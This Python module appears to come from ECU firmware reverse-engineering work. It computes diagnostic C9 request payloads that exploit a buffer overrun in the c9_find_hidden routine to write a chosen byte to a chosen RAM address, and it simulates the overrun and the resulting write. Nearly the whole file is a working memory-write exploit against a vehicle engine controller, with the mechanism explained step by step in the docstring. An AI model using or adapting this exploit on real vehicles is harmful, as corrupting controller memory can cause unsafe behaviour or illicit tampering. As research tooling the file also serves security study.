"""ECU RAM write primitive via the c9_find_hidden buffer overrun.

Computes 20-address C9 payloads that write a chosen byte to a chosen address
in the $0740-$083F downstream range.  The mechanism:

  1. Positions 0-14: fill the 10-entry c9_hidden_addr/idx arrays normally,
     then overrun into handler state (i=10..14).
  2. Position 15 ($5E0A): addr_store hits $07E1/$07E2, setting n=$0A and
     cursor=$0E.  idx_store re-reads n=$0A, writes 15 to $07E1, INC -> $10.
  3. Position 16 ($5E0B): addr_store hits $07E3, writing $0B (bits 0+1 set,
     repairing the flag byte).  idx_store writes 16 to $07E7 (c9_sub_value).
  4. Position 17: addr_store hits $07E5, writing the target payload index
     (target - $0740) as the low byte.  This becomes c9_hidden_idx[$0E].
  5. Position 18: addr_store hits $07E7, writing the desired value as the
     low byte.  This sets c9_sub_value to our chosen byte.
  6. Position 19: dummy (no critical effect).

The reply builder's first frame reads c9_sub_value and writes it to
cs_payload[idx[$0E]] = cs_payload[target_idx] = target address.

References: ROM_ANALYSIS.md sec 10, FINDINGS.md, SKEPTICISM.md.
"""

CS_PAYLOAD    = 0x0740
HIDDEN_ADDR   = 0x07C3
HIDDEN_IDX    = 0x07D7
HIDDEN_N      = 0x07E1
REPLY_CURSOR  = 0x07E2
FWD_FLAGS     = 0x07E3
C9_SUB_VAL    = 0x07E7
FORWARD_LO    = 0x5D40
FORWARD_HI    = 0x623F

# RAM cleared by consult_reset (stop / reinit).  Writes here take effect
# during streaming but are wiped before post-stop readback.
_RESET_PAIRS = [
    (0x073A, 1),   # cs_cmd
    (0x073B, 2),   # cs_argc
    (0x07AC, 2),   # at_req[0..1]
    (0x07AE, 2),   # at_req[2..3]
    (0x07B0, 2),   # at_req[4..5]
    (0x07B7, 2),   # at_active[0..1]
    (0x07B9, 2),   # at_active[2..3]
    (0x07BB, 2),   # at_active[4..5]
]
RESET_CLEARS = set()
for _base, _n in _RESET_PAIRS:
    RESET_CLEARS.update(range(_base, _base + _n))


def compute_payload(target, value):
    """Return a 20-element list of C9 addresses that writes `value` to `target`.

    Target must be in $0740-$083F (the downstream OOB range).
    Value must be a single byte (0-255).
    All returned addresses are in the forwarded range $5D40-$623F.
    """
    if not 0x0740 <= target <= 0x083F:
        raise ValueError(
            f"target ${target:04X} outside downstream range $0740-$083F")
    if not 0x00 <= value <= 0xFF:
        raise ValueError(f"value ${value:02X} outside 0-$FF")

    target_idx = (target - CS_PAYLOAD) & 0xFF
    main     = 0x5E00
    repair_a = 0x5E0A
    repair_b = 0x5E0B
    tgt_addr = 0x5E00 + target_idx
    val_addr = 0x5E00 + value

    return [main] * 15 + [repair_a, repair_b, tgt_addr, val_addr, main]


def simulate_overrun(addr_list):
    """Simulate c9_find_hidden with exact M37732 instruction semantics.

    Returns (ram_dict, store_log) where store_log is a list of
    (kind, iteration, dest_addr, value) tuples.
    """
    ram = {}

    def rb(a):
        return ram.get(a, 0)

    def wb(a, v):
        ram[a] = v & 0xFF

    def rw(a):
        return rb(a) | (rb(a + 1) << 8)

    def ww(a, v):
        wb(a, v & 0xFF)
        wb(a + 1, (v >> 8) & 0xFF)

    cs_argc = len(addr_list) * 2
    for i, a in enumerate(addr_list):
        ww(0x08D2 + 2 * i, a)

    wb(HIDDEN_N, 0)
    wb(FWD_FLAGS, rb(FWD_FLAGS) & ~0x03)

    stores = []
    for i in range(20):
        if 2 * i >= cs_argc:
            break
        a_val = rw(0x08D2 + 2 * i)
        if not (FORWARD_LO <= a_val < 0x6240):
            if 2 * (i + 1) >= cs_argc:
                break
            continue

        wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x01)

        n = rb(HIDDEN_N)
        addr_idx = (2 * n) & 0xFF
        addr_dest = HIDDEN_ADDR + addr_idx
        word = a_val - 0x5000
        ww(addr_dest, word)
        stores.append(("addr", i, addr_dest, word))

        n_re = rb(HIDDEN_N)
        idx_dest = HIDDEN_IDX + n_re
        wb(idx_dest, i & 0xFF)
        stores.append(("idx", i, idx_dest, i & 0xFF))

        wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)

        if 2 * (i + 1) >= cs_argc:
            break

    return ram, stores


def simulate_builder_write(ram):
    """Simulate one frame of consult_reply_c9 at L_9B3F.

    Returns a dict with target, value, cursor, idx on success, or None if the
    builder would skip hidden processing (bit 0 or bit 1 not set).

    Does not model the mailbox handshake gate at $9B2F or the mailbox
    receive at $C862, which also writes $07E7 (c9_sub_value).  Whether the
    overrun's pre-loaded value survives until the downstream store depends
    on timing this simulation does not establish.
    """
    flags = ram.get(FWD_FLAGS, 0)
    if not (flags & 0x01):
        return None
    if not (flags & 0x02):
        return None

    sub_val = ram.get(C9_SUB_VAL, 0)
    cursor = ram.get(REPLY_CURSOR, 0)
    idx_val = ram.get(HIDDEN_IDX + cursor, 0)
    target = CS_PAYLOAD + idx_val

    return {
        "target": target,
        "value": sub_val,
        "cursor": cursor,
        "idx": idx_val,
    }


def simulate_write(target, value):
    """Full dry-run simulation of a write operation.

    Returns a dict with payload, overrun stores, post-overrun RAM, predicted
    builder write, and whether the target survives consult_reset.
    """
    payload = compute_payload(target, value)
    ram, stores = simulate_overrun(payload)
    write = simulate_builder_write(ram)

    return {
        "payload": payload,
        "stores": stores,
        "ram": ram,
        "write": write,
        "persistent": target not in RESET_CLEARS,
    }


def region_label(addr):
    """Human-readable label for a downstream address."""
    regions = [
        (0x0740, 0x0768, "cs_payload", 0x0740),
        (0x076F, 0x079D, "at_values", 0x076F),
        (0x07A0, 0x07A4, "cs_streamlist", 0x07A0),
        (0x07AC, 0x07B7, "at_req", 0x07AC),
        (0x07B7, 0x07C3, "at_active", 0x07B7),
        (0x07C3, 0x07D7, "c9_hidden_addr", 0x07C3),
        (0x07D7, 0x07E1, "c9_hidden_idx", 0x07D7),
        (0x07E1, 0x07E8, "overrun_state", 0x07E1),
        (0x0810, 0x0840, "dtc_seen", 0x0810),
    ]
    for lo, hi, name, base in regions:
        if lo <= addr < hi:
            return f"{name}[{addr - base}]"
    return ""
